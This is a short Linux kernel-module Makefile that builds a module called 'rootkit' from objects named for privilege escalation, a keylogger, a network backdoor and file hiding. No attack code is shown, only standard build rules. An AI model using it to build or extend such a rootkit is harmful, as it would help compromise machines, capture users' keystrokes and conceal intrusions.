obj-m += rootkit.o

# Uncomment for debug
ccflags-y := -DDEBUG

rootkit-objs := src/rootkit.o \
                src/priv_escalate.o \
                src/keylogger.o \
                src/network_backdoor.o \
                src/file_hide.o \
                src/rootkit_utils.o \
                src/rootkit_strings.o 

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
